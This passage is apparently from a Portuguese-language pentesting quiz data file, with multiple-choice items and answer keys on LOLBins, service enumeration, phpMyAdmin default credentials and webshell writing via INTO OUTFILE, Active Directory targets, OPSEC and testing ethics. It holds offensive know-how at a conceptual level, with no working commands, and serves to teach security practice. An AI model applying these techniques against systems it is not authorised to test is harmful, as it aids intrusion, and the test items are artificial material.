    "exp": "Executar scripts e binários diretamente na memória RAM (reflective loading) reduz os artefatos em disco e dificulta a detecção por antivírus tradicionais."
  },
  {
    "id": "h-292",
    "cat": "Forense, Malware & Evasão",
    "q": "O que significa \"LOLBins\" (Living Off the Land Binaries)?",
    "options": [
      "Binários nativos do SO (certutil, bitsadmin, rundll32) abusados para executar ações maliciosas",
      "Antivírus da Microsoft",
      "Ferramentas pagas",
      "Drivers de impressora"
    ],
    "answer": 0,
    "exp": "LOLBins utilizam executáveis legítimos assinados pela Microsoft já presentes no Windows para baixar arquivos, executar código e contornar AppLocker."
  },
  {
    "id": "h-293",
    "cat": "Metodologia & Fundamentos",
    "q": "Cenário: nmap mostra 22 (SSH), 80 (Apache 2.4.29), 3306 fechado. Fluxo mais racional?",
    "options": [
      "Enumerar o Apache (gobuster, nikto, versão) e buscar exploits da versão; testar SSH depois",
      "Ir direto para o root.txt",
      "Rodar mimikatz",
      "Escanear UDP primeiro sem motivo"
    ],
    "answer": 0,
    "exp": "Aplicações web na porta 80 oferecem a maior superfície de ataque (SQLi, upload de webshell) para conseguir a credencial ou chave SSH inicial."
  },
  {
    "id": "h-294",
    "cat": "Web Hacking & Burp",
    "q": "Cenário: gobuster achou /phpmyadmin. O que testar?",
    "options": [
      "Credenciais default (root/senha vazia, root:root), versão do phpMyAdmin com CVEs conhecidas",
      "Apenas fechar a aba",
      "Rodar aircrack",
      "Ignorar sempre"
    ],
    "answer": 0,
    "exp": "phpMyAdmin com credenciais padrão dá acesso direto à manipulação do MySQL e permite escrever arquivos webshell via comandos 'INTO OUTFILE'."
  },
  {
    "id": "h-295",
    "cat": "Windows & Active Directory",
    "q": "Você tem credenciais válidas de um usuário comum do domínio. O QUE NÃO fazer de imediato?",
    "options": [
      "Password spray agressivo com dezenas de senhas contra o DC (risco de lockout e alertas)",
      "Rodar BloodHound coletando dados",
      "Enumerar shares com NetExec",
      "Verificar descrições de usuários/GRPN"
    ],
    "answer": 0,
    "exp": "Disparar força bruta agressiva contra o DC bloqueia contas de funcionários (Account Lockout Threshold) e aciona alertas no SOC imediatamente."
  },
  {
    "id": "h-296",
    "cat": "Windows & Active Directory",
    "q": "Por que senhas de contas de serviço são alvos valiosos?",
    "options": [
      "Costumam ser fortes em complexidade mas nunca rotacionadas, e frequentemente têm privilégios altos",
      "São sempre fracas de propósito",
      "Não têm valor",
      "São armazenadas em texto claro no DNS"
    ],
    "answer": 0,
    "exp": "Service Accounts frequentemente rodam com privilégios locais elevados (LocalSystem) e raramente têm senhas trocadas para não quebrar serviços legados."
  },
  {
    "id": "h-297",
    "cat": "Grey Hat & Ética",
    "q": "O que significa \"OPSEC\" num pentest/Red Team?",
    "options": [
      "Disciplina de operações: minimizar ruído, logs e artefatos que alertem o time de defesa ou queimem técnicas",
      "Nome de uma ferramenta de proxy",
      "Protocolo de e-mail seguro",
      "Sigla de Open Port Scanner"
    ],
    "answer": 0,
    "exp": "Operational Security (OPSEC) abrange as práticas e técnicas para manter a furtividade, evitar assinaturas conhecidas e não expor a infraestrutura de ataque."
  },
  {
    "id": "h-298",
    "cat": "Grey Hat & Ética",
    "q": "Você achou um SQLi em sistema de produção real com dados de clientes. Conduta correta em pentest contratado?",
    "options": [
      "Provar o impacto com o mínimo de acesso/extração necessário (definido no escopo), documentar, NÃO baixar a base inteira",
      "Baixar tudo para provar o ponto",
      "Deletar as tabelas",
      "Vender os dados"
    ],
    "answer": 0,
    "exp": "A ética profissional exige comprovar a vulnerabilidade (ex: extraindo apenas a versão do banco ou nome do usuário atual) sem violar a privacidade de dados de terceiros (LGPD/GDPR)."
  },
  {
    "id": "h-299",
    "cat": "Metodologia & Fundamentos",
    "q": "O que é \"dwell time\" e por que importa pro cliente?",
    "options": [
      "Tempo que um atacante fica indetectado na rede; quanto maior, maior o dano — por isso testes que simulam persistência medem detecção",
      "Tempo de resposta do ping",
      "Duração do contrato",
      "Tempo de boot do servidor"
    ],
    "answer": 0,
    "exp": "Dwell Time é o período entre a invasão inicial e a detecção pelos defensores; simulações avaliam se a equipe azul consegue conter invasores a tempo."
  },
  {
    "id": "h-300",
    "cat": "Grey Hat & Ética",
    "q": "Qual hábito diário mais acelera sua evolução técnica em pentest e cibersegurança?",
    "options": [
      "Prática consistente em labs (máquinas/desafios), documentando cada solução e revisando erros",
      "Assistir só vídeos sem praticar",
      "Acumular ferramentas sem usar",
      "Ler exploits sem entender"
    ],
    "answer": 0,
    "exp": "A consolidação de conhecimento em segurança ofensiva exige prática deliberada em máquinas reais (TryHackMe, HTB, VulnHub) e documentação técnica contínua (writeups)."
  }
];
})(typeof window !== 'undefined' ? window : globalThis);
